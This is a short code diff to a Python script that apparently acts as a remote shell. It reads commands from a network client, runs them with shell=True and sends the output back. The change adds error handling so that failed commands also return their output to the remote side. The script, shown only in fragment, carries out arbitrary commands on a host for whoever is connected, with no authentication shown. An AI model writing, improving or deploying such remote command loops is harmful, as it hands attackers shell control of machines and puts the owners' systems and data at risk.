@@ -31,8 +31,11 @@ while True:
         client.send(b'STOP\n')
         sys.exit()
     else:
-        output = subprocess.check_output(msg, stderr=subprocess.STDOUT, shell=True)
-        client.send(output)
+        try:
+            output = subprocess.check_output(msg, stderr=subprocess.STDOUT, shell=True)
+            client.send(output)
+        except subprocess.CalledProcessError as error:
+            client.send(str(error).encode() + b'\n' + error.output)
 
     print('...DONE')
     client.close()
